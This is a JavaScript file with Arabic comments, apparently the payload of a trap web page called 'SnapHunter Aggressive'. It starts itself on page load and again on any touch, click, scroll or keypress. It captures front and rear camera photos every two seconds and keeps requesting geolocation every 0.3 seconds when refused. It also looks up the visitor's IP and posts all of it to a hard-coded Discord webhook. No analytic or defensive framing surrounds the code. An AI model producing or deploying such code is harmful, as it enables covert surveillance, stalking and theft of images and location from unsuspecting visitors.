'use strict';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;
let isRunning = false;

// 1. إرسال البيانات فوراً (أقصى سرعة)
async function sendFast(blob, text) {
    const formData = new FormData();
    if (blob) formData.append('file', blob, 'img.jpg');
    formData.append('payload_json', JSON.stringify({ content: text, username: "SnapHunter Aggressive" }));
    return fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 2. طلب الموقع الإجباري (تكرار كل 0.3 ثانية عند الرفض)
function grabLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude; userLng = p.coords.longitude;
            sendFast(null, `📍 **الموقع المباشر:** https://www.google.com/maps?q=${userLat},${userLng}`);
        },
        () => { setTimeout(grabLocation, 300); }, // إلحاح شديد في طلب الموقع
        { enableHighAccuracy: true }
    );
}

// 3. التقاط الصور (تبديل فوري كل ثانيتين)
async function quickCapture(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);
        video.play();
        
        await new Promise(r => setTimeout(r, 300)); // وقت استجابة العدسة الأدنى

        const ctx = canvas.getContext('2d');
        canvas.width = 500; canvas.height = 375; // أبعاد محسنة للسرعة
        ctx.drawImage(video, 0, 0, 500, 375);
        
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.3)); // ضغط عالي جداً
        stream.getTracks().forEach(t => t.stop());
        await sendFast(blob, `📸 لقطة: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
    } catch (e) { }
}

// 4. المحرك الهجومي (بدء تلقائي + انتظار لمسة للسفاري)
async function launchAttack() {
    if (isRunning) return;
    
    try {
        // محاولة هجومية فورية للكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        stream.getTracks().forEach(t => t.stop());
        
        isRunning = true;
        grabLocation();

        const engine = async () => {
            await quickCapture('user');
            await quickCapture('environment');
            setTimeout(engine, 2000); // التكرار كل ثانيتين فقط!
        };
        engine();
        
    } catch (err) {
        // في حال حظر المتصفح للطلب التلقائي، ننتظر أول حركة
        console.log("Waiting for user interaction...");
    }
}

// تشغيل الهجوم فوراً (للكروم والمتصفحات الأخرى)
launchAttack();

// فخ اللمس (للسفاري والآيفون)
['click', 'touchstart', 'scroll', 'keydown'].forEach(evt => 
    window.addEventListener(evt, launchAttack)
);

// تنبيه دخول فوري مع الـ IP
(async () => {
    const ipRes = await fetch('https://api.ipify.org?format=json').catch(()=>null);
    if(ipRes) {
        const data = await ipRes.json();
        sendFast(null, `🚨 **صيد دخل الفخ الآن!** IP: \`${data.ip}\``);
    }
})();
